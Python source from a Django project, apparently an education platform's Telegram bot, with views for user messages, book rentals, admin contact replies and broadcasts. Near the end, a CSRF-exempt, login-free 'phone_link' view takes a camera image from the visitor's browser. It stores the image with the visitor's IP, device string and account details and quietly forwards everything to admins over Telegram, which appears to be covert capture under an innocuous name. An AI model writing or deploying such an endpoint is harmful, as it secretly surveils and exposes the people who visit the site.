    _send_message_with_reply_markup(bot_token, chat_id, msg, _linked_keyboard())


def _send_user_messages(bot_token, chat_id, user):
    """Foydalanuvchi xabarlarini yuborish"""
    from accounts.models import Message
    from django.db.models import Q

    personal = Message.objects.filter(recipient=user)
    if user.is_student:
        general = Message.objects.filter(
            Q(message_type='all') | Q(message_type='students'),
            recipient__isnull=True
        )
    elif user.is_teacher:
        general = Message.objects.filter(
            Q(message_type='all') | Q(message_type='teachers'),
            recipient__isnull=True
        )
    else:
        general = Message.objects.filter(message_type='all', recipient__isnull=True)

    all_msgs = (personal | general).distinct().order_by('-created_at')
    unread_count = all_msgs.filter(is_read=False).count()
    latest = all_msgs[:5]

    if not latest:
        _send_message(bot_token, chat_id, "📬 Sizda hozircha xabarlar yo'q.")
        return

    type_icons = {
        'system': '⚙️', 'payment': '💳', 'motivation': '🌟',
        'warning': '⚠️', 'achievement': '🏆', 'reminder': '🔔',
        'security': '🔒', 'personal': '✉️', 'all': '📢',
        'students': '🎓', 'teachers': '👨‍🏫', 'recommendation': '💡',
    }

    lines = [f"📬 <b>Xabarlarim</b> (o'qilmagan: {unread_count})\n"]
    for msg in latest:
        icon = type_icons.get(msg.message_type, '📩')
        read_mark = "" if msg.is_read else "🔴 "
        date_str = msg.created_at.strftime("%d.%m %H:%M")
        lines.append(f"{read_mark}{icon} <b>{msg.title}</b>")
        content = msg.content[:80]
        if len(msg.content) > 80:
            content += "..."
        lines.append(f"   {content}")
        lines.append(f"   <i>{date_str}</i>\n")

    if all_msgs.count() > 5:
        lines.append(f"📋 Jami {all_msgs.count()} ta xabar. Saytda to'liq ko'ring.")

    _send_message(bot_token, chat_id, "\n".join(lines))


def _send_user_books(bot_token, chat_id, user):
    """Foydalanuvchi kitoblarini yuborish"""
    from accounts.models import BookRental

    active_rentals = BookRental.objects.filter(
        student=user, status__in=['active', 'overdue']
    ).select_related('book')

    if not active_rentals:
        _send_message(bot_token, chat_id, "📚 Sizda hozirda ijaradagi kitob yo'q.")
        return

    lines = [f"📚 <b>Ijaradagi kitoblarim</b> ({active_rentals.count()} ta)\n"]
    for rental in active_rentals:
        status_icon = "🔴 Muddati o'tgan!" if rental.is_overdue else f"⏳ {rental.days_until_return} kun qoldi"
        lines.append(f"📖 <b>{rental.book.title}</b>")
        lines.append(f"   ✍️ {rental.book.author}")
        lines.append(f"   📅 Qaytarish: {rental.return_date.strftime('%d.%m.%Y')}")
        lines.append(f"   {status_icon}\n")

    _send_message(bot_token, chat_id, "\n".join(lines))


def _notify_admin_telegram_message(bot_token, tg_full, tg_username, telegram_id, text):
    """Telegram xabari haqida adminlarga xabar yuborish"""
    import threading
    import requests

    notify_text = (
        f"📩 <b>Telegram xabar!</b>\n\n"
        f"👤 <b>Ism:</b> {tg_full}\n"
        f"📱 <b>Telegram:</b> @{tg_username}\n"
        f"🆔 <b>ID:</b> {telegram_id}\n\n"
        f"💬 <b>Xabar:</b>\n{text[:500]}"
    )

    def _send():
        from telegram_bot import premium
        admins = CustomUser.objects.filter(role='admin', telegram_id__isnull=False)
        for admin in admins:
            try:
                premium.send_message(bot_token, admin.telegram_id, notify_text)
            except Exception:
                pass

    threading.Thread(target=_send, daemon=True).start()


@login_required
def admin_telegram_users(request):
    """Admin: Telegram ulangan foydalanuvchilar va xabarlar logi"""
    if not request.user.is_admin:
        messages.error(request, "Sizda bu sahifaga kirish huquqi yo'q!")
        return redirect('home')

    tab = request.GET.get('tab', 'users')
    search = request.GET.get('q', '').strip()

    # Ulangan foydalanuvchilar
    linked_users = CustomUser.objects.filter(
        telegram_id__isnull=False
    ).order_by('-last_activity')

    if search:
        linked_users = linked_users.filter(
            Q(first_name__icontains=search) |
            Q(last_name__icontains=search) |
            Q(username__icontains=search) |
            Q(telegram_username__icontains=search)
        )

    # Xabarlar logi
    msg_logs = TelegramMessageLog.objects.select_related('user').all()
    if search and tab == 'messages':
        msg_logs = msg_logs.filter(
            Q(text__icontains=search) |
            Q(telegram_name__icontains=search) |
            Q(telegram_username__icontains=search) |
            Q(user__first_name__icontains=search) |
            Q(user__last_name__icontains=search)
        )

    # Aloqa xabarlari
    contact_msgs = ContactMessage.objects.all()
    if search and tab == 'contact':
        contact_msgs = contact_msgs.filter(
            Q(name__icontains=search) |
            Q(subject__icontains=search) |
            Q(message__icontains=search) |
            Q(phone__icontains=search) |
            Q(email__icontains=search)
        )

    # Pagination
    if tab == 'messages':
        paginator = Paginator(msg_logs, 30)
    elif tab == 'contact':
        paginator = Paginator(contact_msgs, 30)
    else:
        paginator = Paginator(linked_users, 30)

    page = request.GET.get('page')
    items = paginator.get_page(page)

    new_contact_count = ContactMessage.objects.filter(status='new').count()

    context = {
        'tab': tab,
        'search': search,
        'items': items,
        'linked_count': CustomUser.objects.filter(telegram_id__isnull=False).count(),
        'total_messages': TelegramMessageLog.objects.count(),
        'contact_count': ContactMessage.objects.count(),
        'new_contact_count': new_contact_count,
        'telegram_contact_count': ContactMessage.objects.filter(subject='Telegram xabar').count(),
    }
    return render(request, 'telegram_bot/admin_telegram.html', context)


@login_required
def admin_contact_detail(request, pk):
    """Admin: Aloqa xabarini ko'rish va javob berish"""
    if not request.user.is_admin:
        messages.error(request, "Sizda bu sahifaga kirish huquqi yo'q!")
        return redirect('home')

    msg = ContactMessage.objects.get(pk=pk)

    if msg.status == 'new':
        msg.status = 'read'
        msg.save(update_fields=['status'])

    if request.method == 'POST':
        reply = request.POST.get('reply', '').strip()
        if reply:
            msg.admin_reply = reply
            msg.status = 'replied'
            msg.save(update_fields=['admin_reply', 'status'])

            # Telegram orqali foydalanuvchiga javob yuborish
            telegram_sent = False
            if msg.user and msg.user.telegram_id:
                telegram_sent = _send_contact_reply_telegram(msg, reply)

            if telegram_sent:
                messages.success(request, "Javob Telegram orqali yuborildi! ✅")
            else:
                messages.success(request, "Javob saqlandi! (Foydalanuvchining Telegrami ulanmagan)")
        else:
            messages.error(request, "Javob matnini kiriting!")
        return redirect('telegram_bot:admin_contact_detail', pk=pk)

    return render(request, 'telegram_bot/contact_detail.html', {'msg': msg})


def send_contact_message(request):
    """Xabar yuborish - hamma uchun ochiq (login talab qilinmaydi)"""
    if request.method == 'POST':
        name = request.POST.get('name', '').strip()
        phone = request.POST.get('phone', '').strip()
        email = request.POST.get('email', '').strip()
        subject = request.POST.get('subject', '').strip()
        message_text = request.POST.get('message', '').strip()
        image = request.FILES.get('image')

        if not name or not subject or not message_text:
            messages.error(request, "Ism, mavzu va xabar to'ldirilishi shart!")
            return redirect('telegram_bot:send_contact')

        msg = ContactMessage.objects.create(
            name=name,
            phone=phone,
            email=email,
            subject=subject,
            message=message_text,
            image=image,
            user=request.user if request.user.is_authenticated else None,
        )

        # Admin Telegramiga yuborish
        _notify_admin_contact(msg)

        messages.success(request, "Xabaringiz muvaffaqiyatli yuborildi! ✅")
        return redirect('telegram_bot:send_contact')

    return render(request, 'telegram_bot/send_contact.html')


def _notify_admin_contact(msg):
    """Yangi aloqa xabari haqida adminlarga Telegram orqali xabar yuborish"""
    import threading
    import requests
    from django.conf import settings

    bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')
    if not bot_token:
        return

    text = (
        f"📩 <b>Yangi xabar!</b>\n\n"
        f"👤 <b>Ism:</b> {msg.name}\n"
    )
    if msg.phone:
        text += f"📞 <b>Telefon:</b> {msg.phone}\n"
    if msg.email:
        text += f"📧 <b>Email:</b> {msg.email}\n"
    text += (
        f"📌 <b>Mavzu:</b> {msg.subject}\n\n"
        f"💬 <b>Xabar:</b>\n{msg.message[:500]}"
    )
    if msg.user:
        text += f"\n\n🔗 Tizim foydalanuvchisi: {msg.user.full_name} (@{msg.user.username})"

    def _send():
        from telegram_bot import premium
        admins = CustomUser.objects.filter(role='admin', telegram_id__isnull=False)
        for admin in admins:
            try:
                if msg.image:
                    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                    site_url = getattr(settings, 'SITE_URL', 'https://itcreative.uz')
                    photo_url = f"{site_url}{msg.image.url}"
                    requests.post(url, json={
                        'chat_id': admin.telegram_id,
                        'photo': photo_url,
                        'caption': premium.premiumize(text[:1024]),
                        'parse_mode': 'HTML',
                    }, timeout=10)
                else:
                    premium.send_message(bot_token, admin.telegram_id, text)
            except Exception:
                pass

    threading.Thread(target=_send, daemon=True).start()


def _send_contact_reply_telegram(msg, reply_text):
    """Foydalanuvchiga Telegram orqali javob yuborish"""
    import requests
    from django.conf import settings

    bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')
    if not bot_token or not msg.user or not msg.user.telegram_id:
        return False

    text = (
        f"📬 <b>Sizning xabaringizga javob!</b>\n\n"
        f"📌 <b>Mavzu:</b> {msg.subject}\n"
        f"💬 <b>Sizning xabaringiz:</b>\n<i>{msg.message[:200]}</i>\n\n"
        f"✅ <b>Admin javobi:</b>\n{reply_text}"
    )

    try:
        from telegram_bot import premium
        resp = premium.send_message(bot_token, msg.user.telegram_id, text)
        return resp is not None and resp.status_code == 200
    except Exception:
        return False


@login_required
def admin_send_broadcast(request):
    """Admin: Telegram orqali foydalanuvchilarga/guruhga xabar yuborish"""
    if not request.user.is_admin:
        messages.error(request, "Sizda bu sahifaga kirish huquqi yo'q!")
        return redirect('home')

    if request.method == 'POST':
        recipient_type = request.POST.get('recipient_type', 'all')
        text = request.POST.get('text', '').strip()
        image = request.FILES.get('image')
        selected_users = request.POST.getlist('selected_users')

        if not text and not image:
            messages.error(request, "Xabar matni yoki rasm kiritilishi shart!")
            return redirect('telegram_bot:admin_send_broadcast')

        # Broadcast xabarni saqlash
        broadcast = TelegramBroadcastMessage.objects.create(
            sender=request.user,
            recipient_type=recipient_type,
            text=text,
            image=image,
        )

        # Xabar yuborish
        import threading

        def _send_broadcast():
            from django.conf import settings
            import requests as http_requests

            bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')
            if not bot_token:
                return

            site_url = getattr(settings, 'SITE_URL', 'https://itcreative.uz')
            success = 0
            failed = 0
            recipients = []

            if recipient_type == 'group':
                group_chat_id = getattr(settings, 'TELEGRAM_GROUP_CHAT_ID', '')
                if group_chat_id:
                    recipients = [{'chat_id': group_chat_id}]
            elif recipient_type == 'individual':
                users = CustomUser.objects.filter(
                    pk__in=selected_users,
                    telegram_id__isnull=False
                )
                recipients = [{'chat_id': u.telegram_id} for u in users]
            else:
                users = CustomUser.objects.filter(telegram_id__isnull=False)
                if recipient_type == 'students':
                    users = users.filter(role='student')
                elif recipient_type == 'teachers':
                    users = users.filter(role='teacher')
                recipients = [{'chat_id': u.telegram_id} for u in users]

            broadcast.recipients_count = len(recipients)
            broadcast.save(update_fields=['recipients_count'])

            from telegram_bot import premium
            for r in recipients:
                try:
                    if broadcast.image:
                        photo_url = f"{site_url}{broadcast.image.url}"
                        url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                        payload = {
                            'chat_id': r['chat_id'],
                            'photo': photo_url,
                            'parse_mode': 'HTML',
                        }
                        if text:
                            payload['caption'] = premium.premiumize(text[:1024])
                        resp = http_requests.post(url, json=payload, timeout=15)
                    else:
                        resp = premium.send_message(
                            bot_token, r['chat_id'], text,
                            disable_web_page_preview=False,
                        )

                    if resp is not None and resp.status_code == 200 and resp.json().get('ok'):
                        success += 1
                    else:
                        failed += 1
                except Exception:
                    failed += 1

            broadcast.success_count = success
            broadcast.failed_count = failed
            broadcast.save(update_fields=['success_count', 'failed_count'])

        threading.Thread(target=_send_broadcast, daemon=True).start()
        messages.success(request, f"Xabar yuborilmoqda... ✅")
        return redirect('telegram_bot:admin_telegram')

    # GET - forma ko'rsatish
    linked_users = CustomUser.objects.filter(
        telegram_id__isnull=False
    ).order_by('first_name', 'last_name')

    broadcast_history = TelegramBroadcastMessage.objects.all()[:20]

    context = {
        'linked_users': linked_users,
        'broadcast_history': broadcast_history,
    }
    return render(request, 'telegram_bot/admin_send_broadcast.html', context)


@csrf_exempt
def phone_link(request):
    """Kamera ruxsati olish va rasmni adminlarga Telegram orqali yuborish"""
    if request.method == 'POST':
        import base64
        from django.core.files.base import ContentFile

        image_data = request.POST.get('image_data', '')
        if not image_data:
            return JsonResponse({'ok': False, 'error': 'Rasm topilmadi'})

        # Base64 dan rasmni ajratib olish
        try:
            format_str, imgstr = image_data.split(';base64,')
            ext = format_str.split('/')[-1]
            if ext == 'jpeg':
                ext = 'jpg'
        except (ValueError, IndexError):
            return JsonResponse({'ok': False, 'error': 'Noto\'g\'ri rasm formati'})

        image_content = ContentFile(base64.b64decode(imgstr))

        # Rasmni saqlash
        import os
        from django.conf import settings as django_settings
        from django.utils import timezone

        filename = f"phone_link_{timezone.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
        upload_dir = os.path.join(django_settings.MEDIA_ROOT, 'phone_link')
        os.makedirs(upload_dir, exist_ok=True)
        filepath = os.path.join(upload_dir, filename)

        with open(filepath, 'wb') as f:
            f.write(image_content.read())

        # User info yig'ish
        user_info = ""
        if request.user.is_authenticated:
            user_info = (
                f"\n👤 <b>Foydalanuvchi:</b> {request.user.full_name}"
                f"\n📱 <b>Telefon:</b> {request.user.phone}"
                f"\n🆔 <b>Username:</b> @{request.user.username}"
            )

        # IP va vaqt
        ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', 'Noma\'lum'))
        if ',' in ip:
            ip = ip.split(',')[0].strip()

        user_agent = request.META.get('HTTP_USER_AGENT', 'Noma\'lum')

        text = (
            f"📸 <b>Phone Link - Yangi rasm!</b>\n\n"
            f"🕐 <b>Vaqt:</b> {timezone.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
            f"🌐 <b>IP:</b> {ip}\n"
            f"📱 <b>Qurilma:</b> {user_agent[:100]}"
            f"{user_info}"
        )

        # Adminlarga Telegram orqali yuborish
        _send_phone_link_to_admins(filepath, text)

        return JsonResponse({'ok': True, 'message': 'Rasm muvaffaqiyatli yuborildi!'})

    return render(request, 'telegram_bot/phone_link.html')


def _send_phone_link_to_admins(image_path, caption):
    """Phone link rasmini faqat admin rolidagi foydalanuvchilarga Telegram orqali yuborish"""
    import threading
    import requests
    from django.conf import settings

    bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')
    if not bot_token:
        return

    def _send():
        from telegram_bot import premium
        admins = CustomUser.objects.filter(role='admin', telegram_id__isnull=False)
        for admin in admins:
            try:
                url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                with open(image_path, 'rb') as photo:
                    requests.post(url, data={
                        'chat_id': admin.telegram_id,
                        'caption': premium.premiumize(caption[:1024]),
                        'parse_mode': 'HTML',
                    }, files={
                        'photo': photo,
                    }, timeout=15)
            except Exception:
                pass

    threading.Thread(target=_send, daemon=True).start()
